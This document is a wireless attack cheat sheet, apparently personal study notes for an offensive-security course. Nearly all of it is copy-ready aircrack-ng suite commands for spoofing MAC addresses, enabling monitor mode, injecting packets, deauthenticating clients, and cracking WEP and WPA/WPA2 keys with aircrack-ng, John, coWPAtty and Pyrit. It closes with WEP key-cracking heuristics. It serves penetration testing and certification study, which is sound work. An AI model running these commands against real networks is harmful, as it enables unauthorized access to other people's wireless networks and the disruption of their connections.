---
title: Wireless Attacks Cheat Sheet
tags:
  - OffSec
  - Wireless
date: 2020-06-29
---


# Wireless

### MAC

```shell
root@bt:~# macchanger --show <interface name>
Current MAC: 00:f1:40:93:00:f5 (unknown)

#  Set the MAC XX:XX:XX:XX:XX:XX
macchanger --mac=XX:XX:XX:XX:XX:XX mon0
```

### Open the Monitor Mode

```shell
root@bt:~# airmon-ng check kill && ifconfig wlan1 down && iwconfig wlan1 mode monitor && ifconfig wlan1 up && airmon-ng start wlan1 3
root@bt:~# airmon-ng check kill && ifconfig mon0 down && iwconfig mon0 mode monitor && ifconfig mon0 up

iwconfig <interface name> mode monitor channel <channel number>
```

## Injection Test

#### Basic Injection Test

(Single Card)

```shell
root@bt:~# aireplay-ng -9 <interface name>
root@bt:~# aireplay-ng -9 mon0
```

#### Injection Test for Hidden or Specific SSID

```shell
root@bt:~# aireplay-ng -9 -e <ESSID> -a <AP MAC> <interface name>
root@bt:~# aireplay-ng -9 -e 'STAGE TEST' -a 08:57:00:64:2E:B0 mon0
```

#### Card-to-Cad (Attack) Injection Test

(Two Cards)

```shell
root@bt:~# aireplay-ng -9 -i <input interface> <interface name>
```

# Wired Equivalent Privacy (WEP)

## Open Authentication

### Cracking WEP with Connected Clients

```shell
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
aircrack-ng <capture>
```

### Cracking WEP via a Client

```
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>
aircrack-ng -z <capture>
```

### Cracking Clientless WEP Networks

```shell
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>

# Run attack 4, the KoreK chopchop attack (or attack 5, the fragmentation attack):
aireplay-ng -4 -b <AP MAC> -h <Your MAC> <interface>
aireplay-ng -5 -b <AP MAC> -h <Your MAC> <interface> (Need Card Support)

packetforge-ng -0 -a <AP MAC> -h <Your MAC> -l <Source IP> -k <Dest IP> -y
<xor filename> -w <output filename>
# packetforge-ng -0 -a 08:57:00:64:2E:B0 -h 00:f1:40:93:00:f5 -l 192.168.1.113 -k 192.168.1.255 -y replay_dec-0705-020358.xor -w arp-korek

aireplay-ng -2 -r <packet filename> <interface>
aircrack-ng <capture>
```

## Shared Key Authentication

```shell
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>

aireplay-ng -1 0 -e <ESSID> -y <keystream file> -a <AP MAC> -h <Your MAC>
<interface>
# aireplay-ng -1 6000 -e 'STAGE TEST' -y wepshared-01-08-57-00-64-2E-B0.xor -a 08:57:00:64:2E:B0 -h 94:0c:6d:7c:ca:73 mon0

aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
aircrack-ng <capture>
```

# WPA/WPA2

## Cracking WPA/WPA2 PSK with Aircrack-ng

```shell
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -0 1 -a<AP MAC> -c <Client MAC> <interface>
# dictionary mode
aircrack-ng -w <wordlist> <capture>

# Airolib-ng database
aircrack-ng -r <db name> <capture>
```

## Cracking WPA with JTR and Aircrack-ng

```shell
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <ESSID> -w - <capture>
```

## Cracking WPA with coWPAtty

```shell
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>

genpmk -f <wordlist> -d <hashes filename> -s <ESSID>
genpmk -f /pentest/passwords/john/password.lst -d wifuhashes -s 'STAGE TEST WPA'

cowpatty -r <capture> -d <hashes filename> -2 -s <ESSID>
```

## Cracking WPA with Pyrit

```shell
airmon-ng start <interface> <AP channel>
pyrit -r <interface> -o <capture> stripLive
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>

# dictionary mode
pyrit -r <capture> -i <wordlist> -b <AP MAC> attack_passthrough

# database mode
pyrit -i <wordlist> import_passwords
pyrit -e <ESSID> create_essid
pyrit batch
pyrit -r <capture> -b <AP MAC> attack_db
```

## Airolib-ng

```shell
echo wifu > essid.txt
airolib-ng <db name> --import essid <essid filename>
airolib-ng <db name> --import passwd <wordlist>
airolib-ng <db name> --clean all
airolib-ng <db name> --stats
airolib-ng <db name> --batch
airolib-ng <db name> --verify all
aircrack-ng -r <db name> <capture>
```

# General Approach to Cracking WEP Keys

- Typically, you need 250000 or more unique IVs for 64-bit keys and 1.5 million or more for 128-bit keys.

- Generally speaking, don’t try to crack the WEP key until you have at least 100000 IVs.

- Start by trying 64-bit keys with `aircrack-ng -n 64 <capture filename>`. If 64-bit WEP is used, it can usually be cracked in less than 5 minutes and usually less than 60 seconds with relatively few IVs. If the 64-bit key is not found in 5 minutes, restart Aircrack in generic mode with `aircrack-ng <capture filename>` and then, at each 100000 IVs mark, retry `aircrack-ng -n 64 <capture filename>` for 5 minutes.

- Once you hit 600000 IVs, switch to testing 128-bit keys.

- Once you hit 2 million IVs, try changing the fudge factor to ‘-f 4’ and run it for at least 30 minutes and up to one hour. Retry, increasing the fudge factor by adding 4 to it each time. You should also try increasing the fudge factor whenever Aircrack-ng stops after having tried all possible keys.

- All the while, keep collecting data. Remember the golden rule: “the more IVs, the better”. Also, check the next section on how to determine which options to use as these can significantly speed up cracking the WEP key. For example, if the key is entirely numeric, then it can take as few as 50000 IVs to crack a 64-bit key with the ‘-t’ parameter versus 200000 IVs without it. So if you have a hunch about the WEP key, it is worth trying a few variations.

- The number of unique IVs that you need varies drastically depending on a number of factors. You can consider the following as a rough guideline:
    ○ FMS/KoreK 64-bit—250,000 Unique IVs
    ○ FMS/KoreK 128-bit—1,500,000 Unique IVs
    ○ PTW 64-bit—20,000 packets
    ○ PTW 128-bit—40,000-85,000 packets

    

|        Encryption         |    Password    |  Ivs  |
| :-----------------------: | :------------: | :---: |
| WEP - Open Authentication | AA:BB:CC:DD:EE | 16875 |
|                           |                |       |
|                           |                |       |

